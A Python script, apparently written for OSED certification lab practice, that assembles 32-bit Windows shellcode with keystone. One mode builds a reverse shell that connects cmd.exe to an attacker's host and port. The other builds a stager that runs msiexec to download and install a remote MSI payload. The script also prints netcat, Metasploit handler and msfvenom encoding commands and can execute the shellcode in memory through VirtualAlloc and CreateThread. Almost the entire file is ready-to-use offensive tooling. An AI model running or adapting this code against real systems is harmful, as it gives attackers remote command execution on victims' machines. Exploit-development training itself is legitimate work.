#!/usr/bin/python3
import argparse
import ctypes
import struct
import sys

import keystone as ks


def to_hex(s):
    retval = list()
    for char in s:
        retval.append(hex(ord(char)).replace("0x", ""))
    return "".join(retval)


def to_sin_ip(ip_address):
    ip_addr_hex = []
    for block in ip_address.split("."):
        ip_addr_hex.append(format(int(block), "02x"))
    ip_addr_hex.reverse()
    return "0x" + "".join(ip_addr_hex)


def to_sin_port(port):
    port_hex = format(int(port), "04x")
    return "0x" + str(port_hex[2:4]) + str(port_hex[0:2])


def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;",
        "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
        "   find_kernel32:                       ",
        "       xor ecx,ecx                     ;",  # ECX = 0
        "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
        "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
        # ESI = PEB->Ldr.InInitOrder
        "       mov esi,[esi+1Ch]               ;",
        "   next_module:                         ",
        # EBX = InInitOrder[X].base_address
        "       mov ebx, [esi+8h]               ;",
        # EDI = InInitOrder[X].module_name
        "       mov edi, [esi+20h]              ;",
        # ESI = InInitOrder[X].flink (next)
        "       mov esi, [esi]                  ;",
        # (unicode) modulename[12] == 0x00?
        "       cmp [edi+12*2], cx              ;",
        "       jne next_module                 ;",  # No: try next module.
        "   find_function_shorten:               ",
        "       jmp find_function_shorten_bnc   ;",  # Short jump
        "   find_function_ret:                   ",
        # POP the return address from the stack
        "       pop esi                         ;",
        # Save find_function address for later usage
        "       mov [ebp+0x04], esi             ;",
        "       jmp resolve_symbols_kernel32    ;",
        "   find_function_shorten_bnc:           ",
        "       call find_function_ret          ;",  # Relative CALL with negative offset
        "   find_function:                       ",
        # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
        "       pushad                          ;",
        "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
        # Export Table Directory RVA
        "       mov edi, [ebx+eax+0x78]         ;",
        "       add edi, ebx                    ;",  # Export Table Directory VMA
        "       mov ecx, [edi+0x18]             ;",  # NumberOfNames
        "       mov eax, [edi+0x20]             ;",  # AddressOfNames RVA
        "       add eax, ebx                    ;",  # AddressOfNames VMA
        # Save AddressOfNames VMA for later
        "       mov [ebp-4], eax                ;",
        "   find_function_loop:                  ",
        "       jecxz find_function_finished    ;",  # Jump to the end if ECX is 0
        "       dec ecx                         ;",  # Decrement our names counter
        # Restore AddressOfNames VMA
        "       mov eax, [ebp-4]                ;",
        # Get the RVA of the symbol name
        "       mov esi, [eax+ecx*4]            ;",
        "       add esi, ebx                    ;",  # Set ESI to the VMA of the current
        "   compute_hash:                        ",
        "       xor eax, eax                    ;",  # NULL EAX
        "       cdq                             ;",  # NULL EDX
        "       cld                             ;",  # Clear direction
        "   compute_hash_again:                  ",
        # Load the next byte from esi into al
        "       lodsb                           ;",
        "       test al, al                     ;",  # Check for NULL terminator
        # If the ZF is set, we've hit the NULL term
        "       jz compute_hash_finished        ;",
        "       ror edx, 0x0d                   ;",  # Rotate edx 13 bits to the right
        # Add the new byte to the accumulator
        "       add edx, eax                    ;",
        "       jmp compute_hash_again          ;",  # Next iteration
        "   compute_hash_finished:               ",
        "   find_function_compare:               ",
        # Compare the computed hash with the requested hash
        "       cmp edx, [esp+0x24]             ;",
        # If it doesn't match go back to find_function_loop
        "       jnz find_function_loop          ;",
        # AddressOfNameOrdinals RVA
        "       mov edx, [edi+0x24]             ;",
        "       add edx, ebx                    ;",  # AddressOfNameOrdinals VMA
        # Extrapolate the function's ordinal
        "       mov cx, [edx+2*ecx]             ;",
        "       mov edx, [edi+0x1c]             ;",  # AddressOfFunctions RVA
        "       add edx, ebx                    ;",  # AddressOfFunctions VMA
        "       mov eax, [edx+4*ecx]            ;",  # Get the function RVA
        "       add eax, ebx                    ;",  # Get the function VMA
        # Overwrite stack version of eax from pushad
        "       mov [esp+0x1c], eax             ;",
        "   find_function_finished:              ",
        "       popad                           ;",  # Restore registers
        "       ret                             ;",
        "   resolve_symbols_kernel32:            ",
        "       push 0x78b5b983                 ;",  # TerminateProcess hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        # Save TerminateProcess address for later
        "       mov [ebp+0x10], eax             ;",
        "       push 0xec0e4e8e                 ;",  # LoadLibraryA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        # Save LoadLibraryA address for later
        "       mov [ebp+0x14], eax             ;",
        "       push 0x16b3fe72                 ;",  # CreateProcessA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        # Save CreateProcessA address for later
        "       mov [ebp+0x18], eax             ;",
        "   load_ws2_32:                         ",
        "       xor eax, eax                    ;",  # Null EAX
        "       mov ax, 0x6c6c                  ;",  # Move the end of the string in AX
        # Push EAX on the stack with string NULL terminator
        "       push eax                        ;",
        # Push part of the string on the stack
        "       push 0x642e3233                 ;",
        # Push another part of the string on the stack
        "       push 0x5f327377                 ;",
        # Push ESP to have a pointer to the string
        "       push esp                        ;",
        "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
        "   resolve_symbols_ws2_32:              ",
        # Move the base address of ws2_32.dll to EBX
        "       mov ebx, eax                    ;",
        "       push 0x3bfcedcb                 ;",  # WSAStartup hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        # Save WSAStartup address for later usage
        "       mov [ebp+0x1C], eax             ;",
        "       push 0xadf509d9                 ;",  # WSASocketA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        # Save WSASocketA address for later usage
        "       mov [ebp+0x20], eax             ;",
        "       push 0xb32dba0c                 ;",  # WSAConnect hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        # Save WSAConnect address for later usage
        "       mov [ebp+0x24], eax             ;",
        "   call_wsastartup:                    ;",
        "       mov eax, esp                    ;",  # Move ESP to EAX
        "       mov cx, 0x590                   ;",  # Move 0x590 to CX
        # Substract CX from EAX to avoid overwriting the structure later
        "       sub eax, ecx                    ;",
        "       push eax                        ;",  # Push lpWSAData
        "       xor eax, eax                    ;",  # Null EAX
        "       mov ax, 0x0202                  ;",  # Move version to AX
        "       push eax                        ;",  # Push wVersionRequired
        "       call dword ptr [ebp+0x1C]       ;",  # Call WSAStartup
        "   call_wsasocketa:                     ",
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push dwFlags
        "       push eax                        ;",  # Push g
        "       push eax                        ;",  # Push lpProtocolInfo
        "       mov al, 0x06                    ;",  # Move AL, IPPROTO_TCP
        "       push eax                        ;",  # Push protocol
        "       sub al, 0x05                    ;",  # Substract 0x05 from AL, AL = 0x01
        "       push eax                        ;",  # Push type
        "       inc eax                         ;",  # Increase EAX, EAX = 0x02
        "       push eax                        ;",  # Push af
        "       call dword ptr [ebp+0x20]       ;",  # Call WSASocketA
        "   call_wsaconnect:                     ",
        "       mov esi, eax                    ;",  # Move the SOCKET descriptor to ESI
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push sin_zero[]
        "       push eax                        ;",  # Push sin_zero[]
        # Push sin_addr (example: 192.168.2.1)
        f"      push {to_sin_ip(rev_ip_addr)}   ;",
        # Move the sin_port (example: 443) to AX
        f"      mov ax, {to_sin_port(rev_port)} ;",
        "       shl eax, 0x10                   ;",  # Left shift EAX by 0x10 bytes
        "       add ax, 0x02                    ;",  # Add 0x02 (AF_INET) to AX
        "       push eax                        ;",  # Push sin_port & sin_family
        # Push pointer to the sockaddr_in structure
        "       push esp                        ;",
        # Store pointer to sockaddr_in in EDI
        "       pop edi                         ;",
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push lpGQOS
        "       push eax                        ;",  # Push lpSQOS
        "       push eax                        ;",  # Push lpCalleeData
        "       push eax                        ;",  # Push lpCalleeData
        "       add al, 0x10                    ;",  # Set AL to 0x10
        "       push eax                        ;",  # Push namelen
        "       push edi                        ;",  # Push *name
        "       push esi                        ;",  # Push s
        "       call dword ptr [ebp+0x24]       ;",  # Call WSAConnect
        "   create_startupinfoa:                 ",
        "       push esi                        ;",  # Push hStdError
        "       push esi                        ;",  # Push hStdOutput
        "       push esi                        ;",  # Push hStdInput
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push lpReserved2
        "       push eax                        ;",  # Push cbReserved2 & wShowWindow
        "       mov al, 0x80                    ;",  # Move 0x80 to AL
        "       xor ecx, ecx                    ;",  # Null ECX
        "       mov cl, 0x80                    ;",  # Move 0x80 to CX
        "       add eax, ecx                    ;",  # Set EAX to 0x100
        "       push eax                        ;",  # Push dwFlags
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push dwFillAttribute
        "       push eax                        ;",  # Push dwYCountChars
        "       push eax                        ;",  # Push dwXCountChars
        "       push eax                        ;",  # Push dwYSize
        "       push eax                        ;",  # Push dwXSize
        "       push eax                        ;",  # Push dwY
        "       push eax                        ;",  # Push dwX
        "       push eax                        ;",  # Push lpTitle
        "       push eax                        ;",  # Push lpDesktop
        "       push eax                        ;",  # Push lpReserved
        "       mov al, 0x44                    ;",  # Move 0x44 to AL
        "       push eax                        ;",  # Push cb
        # Push pointer to the STARTUPINFOA structure
        "       push esp                        ;",
        # Store pointer to STARTUPINFOA in EDI
        "       pop edi                         ;",
        "   create_cmd_string:                   ",
        "       mov eax, 0xff9a879b             ;",  # Move 0xff9a879b into EAX
        "       neg eax                         ;",  # Negate EAX, EAX = 00657865
        "       push eax                        ;",  # Push part of the "cmd.exe" string
        # Push the remainder of the "cmd.exe"
        "       push 0x2e646d63                 ;",
        # Push pointer to the "cmd.exe" string
        "       push esp                        ;",
        # Store pointer to the "cmd.exe" string
        "       pop ebx                         ;",
        "   call_createprocessa:                 ",
        "       mov eax, esp                    ;",  # Move ESP to EAX
        "       xor ecx, ecx                    ;",  # Null ECX
        "       mov cx, 0x390                   ;",  # Move 0x390 to CX
        # Substract CX from EAX to avoid overwriting the structure later
        "       sub eax, ecx                    ;",
        "       push eax                        ;",  # Push lpProcessInformation
        "       push edi                        ;",  # Push lpStartupInfo
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push lpCurrentDirectory
        "       push eax                        ;",  # Push lpEnvironment
        "       push eax                        ;",  # Push dwCreationFlags
        # Increase EAX, EAX = 0x01 (TRUE)
        "       inc eax                         ;",
        "       push eax                        ;",  # Push bInheritHandles
        "       dec eax                         ;",  # Null EAX
        "       push eax                        ;",  # Push lpThreadAttributes
        "       push eax                        ;",  # Push lpProcessAttributes
        "       push ebx                        ;",  # Push lpCommandLine
        "       push eax                        ;",  # Push lpApplicationName
        "       call dword ptr [ebp+0x18]       ;",  # Call CreateProcessA
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;",  # Null ECX
        "       push ecx                        ;",  # uExitCode
        "       push 0xffffffff                 ;",  # hProcess
        "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
    ]
    return "\n".join(asm)


def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
    # strip the port if it is 80
    if rev_port == "80":
        rev_port = ""
    else:
        rev_port = ":" + rev_port

    rev_hex_payload = str(
        to_hex(f"msiexec /i http://{rev_ip_addr}{rev_port}/X /qn"))
    rev_hex_payload_len = len(rev_hex_payload)

    instructions = []
    first_instructions = []
    null_terminated = False
    for i in range(rev_hex_payload_len, 0, -1):
        # add every 4 byte (8 chars) to one push statement
        if (i != 0) and ((i % 8) == 0):
            target_bytes = rev_hex_payload[i - 8:i]
            instructions.append(
                f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};"
            )
        # handle the left ofer instructions
        elif (0 == i - 1) and ((i % 8) != 0):
            if rev_hex_payload_len % 8 == 2:
                first_instructions.append(
                    f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};"
                )
                first_instructions.append("push eax;")
            elif rev_hex_payload_len % 8 == 4:
                target_bytes = rev_hex_payload[(rev_hex_payload_len -
                                                (rev_hex_payload_len % 8)):]
                first_instructions.append(
                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                first_instructions.append("push eax;")
            else:
                target_bytes = rev_hex_payload[(rev_hex_payload_len -
                                                (rev_hex_payload_len % 8)):]
                first_instructions.append(f"mov al, 0x{target_bytes[4:6]};")
                first_instructions.append("push eax;")
                first_instructions.append(
                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                first_instructions.append("push ax;")
            null_terminated = True

    instructions = first_instructions + instructions
    asm_instructions = "".join(instructions)
    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;",
        "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
        "   find_kernel32:                       ",
        "       xor ecx,ecx                     ;",  # ECX = 0
        "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
        "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
        # ESI = PEB->Ldr.InInitOrder
        "       mov esi,[esi+1Ch]               ;",
        "   next_module:                         ",
        # EBX = InInitOrder[X].base_address
        "       mov ebx, [esi+8h]               ;",
        # EDI = InInitOrder[X].module_name
        "       mov edi, [esi+20h]              ;",
        # ESI = InInitOrder[X].flink (next)
        "       mov esi, [esi]                  ;",
        # (unicode) modulename[12] == 0x00?
        "       cmp [edi+12*2], cx              ;",
        "       jne next_module                 ;",  # No: try next module.
        "   find_function_shorten:               ",
        "       jmp find_function_shorten_bnc   ;",  # Short jump
        "   find_function_ret:                   ",
        # POP the return address from the stack
        "       pop esi                         ;",
        # Save find_function address for later usage
        "       mov [ebp+0x04], esi             ;",
        "       jmp resolve_symbols_kernel32    ;",
        "   find_function_shorten_bnc:           ",
        "       call find_function_ret          ;",  # Relative CALL with negative offset
        "   find_function:                       ",
        # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
        "       pushad                          ;",
        "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
        # Export Table Directory RVA
        "       mov edi, [ebx+eax+0x78]         ;",
        "       add edi, ebx                    ;",  # Export Table Directory VMA
        "       mov ecx, [edi+0x18]             ;",  # NumberOfNames
        "       mov eax, [edi+0x20]             ;",  # AddressOfNames RVA
        "       add eax, ebx                    ;",  # AddressOfNames VMA
        # Save AddressOfNames VMA for later
        "       mov [ebp-4], eax                ;",
        "   find_function_loop:                  ",
        "       jecxz find_function_finished    ;",  # Jump to the end if ECX is 0
        "       dec ecx                         ;",  # Decrement our names counter
        # Restore AddressOfNames VMA
        "       mov eax, [ebp-4]                ;",
        # Get the RVA of the symbol name
        "       mov esi, [eax+ecx*4]            ;",
        "       add esi, ebx                    ;",  # Set ESI to the VMA of the current
        "   compute_hash:                        ",
        "       xor eax, eax                    ;",  # NULL EAX
        "       cdq                             ;",  # NULL EDX
        "       cld                             ;",  # Clear direction
        "   compute_hash_again:                  ",
        # Load the next byte from esi into al
        "       lodsb                           ;",
        "       test al, al                     ;",  # Check for NULL terminator
        # If the ZF is set, we've hit the NULL term
        "       jz compute_hash_finished        ;",
        "       ror edx, 0x0d                   ;",  # Rotate edx 13 bits to the right
        # Add the new byte to the accumulator
        "       add edx, eax                    ;",
        "       jmp compute_hash_again          ;",  # Next iteration
        "   compute_hash_finished:               ",
        "   find_function_compare:               ",
        # Compare the computed hash with the requested hash
        "       cmp edx, [esp+0x24]             ;",
        # If it doesn't match go back to find_function_loop
        "       jnz find_function_loop          ;",
        # AddressOfNameOrdinals RVA
        "       mov edx, [edi+0x24]             ;",
        "       add edx, ebx                    ;",  # AddressOfNameOrdinals VMA
        # Extrapolate the function's ordinal
        "       mov cx, [edx+2*ecx]             ;",
        "       mov edx, [edi+0x1c]             ;",  # AddressOfFunctions RVA
        "       add edx, ebx                    ;",  # AddressOfFunctions VMA
        "       mov eax, [edx+4*ecx]            ;",  # Get the function RVA
        "       add eax, ebx                    ;",  # Get the function VMA
        # Overwrite stack version of eax from pushad
        "       mov [esp+0x1c], eax             ;",
        "   find_function_finished:              ",
        "       popad                           ;",  # Restore registers
        "       ret                             ;",
        "   resolve_symbols_kernel32:            ",
        "       push 0x78b5b983                 ;",  # TerminateProcess hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        # Save TerminateProcess address for later
        "       mov [ebp+0x10], eax             ;",
        "       push 0xec0e4e8e                 ;",  # LoadLibraryA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        # Save LoadLibraryA address for later
        "       mov [ebp+0x14], eax             ;",
        "   load_msvcrt:                         ",
        # Null EAX / Push the target library string on the stack --> msvcrt.dll  -->  6d737663 72742e64 6c6c
        "       xor eax, eax                    ;",
        "       mov ax, 0x6c6c                  ;",  # ll     --> 0x6c6c      --> 0x6c6c
        "       push eax                        ;",
        # rt.d   --> 0x72742e64  --> 0x642e7472
        "       push 0x642e7472                 ;",
        # msvc   --> 0x6d737663  --> 0x6376736d
        "       push 0x6376736d                 ;",
        # Push ESP to have a pointer to the string
        "       push esp                        ;",
        "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
        "   resolve_symbols_msvcrt:              ",
        # Move the base address of msvcrt.dll to EBX
        "       mov ebx, eax                    ;",
        "       push 0x692fada7                 ;",  # System hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        # Save System address for later
        "       mov [ebp+0x18], eax             ;",
        # Push the target sting on the stack --> msiexec /i http://192.168.1.167/X /qn   -->  http://string-functions.com/string-hex.aspx
        "   call_system:                         ",
        "       xor eax, eax                    ;",  # Null EAX
        f"{['push eax;', ''][null_terminated]}   ",
        asm_instructions,
        # Push the pointer to the command on the stack
        "       push esp                        ;",
        # Call system (https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-160)
        "       call dword ptr [ebp+0x18]       ;",
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;",  # Null ECX
        "       push ecx                        ;",  # uExitCode
        "       push 0xffffffff                 ;",  # hProcess
        "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
    ]
    return "\n".join(asm)


def main(args):
    help_msg = ""
    if args.msi:
        shellcode = msi_shellcode(args.lhost, args.lport, args.debug_break)
        help_msg += f"\t Create msi payload:\n"
        help_msg += f"\t\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n"
        help_msg += f"\t Start http server (hosting the msi file):\n"
        help_msg += f"\t\t sudo python -m SimpleHTTPServer {args.lport} \n"
        help_msg += f"\t Start the metasploit listener:\n"
        help_msg += f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT 443; exploit"'
    else:
        shellcode = rev_shellcode(args.lhost, args.lport, args.debug_break)
        help_msg += f"\t Start listener:\n"
        help_msg += f"\t\t nc -lnvp {args.lport}"

    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
    encoding, count = eng.asm(shellcode)

    final = ""

    final += 'shellcode = b"'

    for enc in encoding:
        final += "\\x{0:02x}".format(enc)

    final += '"'

    sentry = False

    for bad in args.bad_chars:
        if bad in final:
            print(f"[!] Found 0x{bad}")
            sentry = True

    if sentry:
        print(f"[=] {final}", file=sys.stderr)
        raise SystemExit("[!] Remove bad characters and try again")

    print(f"[+] shellcode created!")
    print(f"[=]   len:   {len(encoding)} bytes")
    print(f"[=]   lhost: {args.lhost}")
    print(f"[=]   lport: {args.lport}")
    print(
        f"[=]   break: {['breakpoint disabled', 'breakpoint active'][args.debug_break]}"
    )
    print(f"[=]   ver:   {['pure reverse sehll', 'MSI stager'][args.msi]}")
    if args.store_shellcode:
        print(f"[=]   Shellcode stored in: shellcode.bin")
        f = open("shellcode.bin", "wb")
        f.write(bytearray(encoding))
        f.close()
    print(f"[=]   help:")
    print(help_msg)
    print("\t Remove bad chars with msfvenom (use --store-shellcode flag): ")
    print(
        '\t\t cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d" -f python -v shellcode'
    )
    print()
    print(final)

    if args.test_shellcode:
        print(f"\n[+] Debugging shellcode ...")
        sh = b""
        for e in encoding:
            sh += struct.pack("B", e)

        packed_shellcode = bytearray(sh)
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0),
            ctypes.c_int(len(packed_shellcode)),
            ctypes.c_int(0x3000),
            ctypes.c_int(0x40),
        )
        buf = (ctypes.c_char *
               len(packed_shellcode)).from_buffer(packed_shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode)))
        print("[=]   Shellcode located at address %s" % hex(ptr))
        input("...ENTER TO EXECUTE SHELLCODE...")
        ht = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.c_int(ptr),
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.pointer(ctypes.c_int(0)),
        )
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
                                                   ctypes.c_int(-1))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Creates shellcodes compatible with the OSED lab VM")

    parser.add_argument(
        "-l",
        "--lhost",
        help="listening attacker system (default: 127.0.0.1)",
        default="127.0.0.1",
    )
    parser.add_argument(
        "-p",
        "--lport",
        help="listening port of the attacker system (default: 4444)",
        default="4444",
    )
    parser.add_argument(
        "-b",
        "--bad-chars",
        help=
        "space separated list of bad chars to check for in final egghunter (default: 00)",
        default=["00"],
        nargs="+",
    )
    parser.add_argument("-m",
                        "--msi",
                        help="use an msf msi exploit stager (short)",
                        action="store_true")
    parser.add_argument(
        "-d",
        "--debug-break",
        help="add a software breakpoint as the first shellcode instruction",
        action="store_true",
    )
    parser.add_argument(
        "-t",
        "--test-shellcode",
        help="test the shellcode on the system",
        action="store_true",
    )
    parser.add_argument(
        "-s",
        "--store-shellcode",
        help="store the shellcode in binary format in the file shellcode.bin",
        action="store_true",
    )

    args = parser.parse_args()

    main(args)
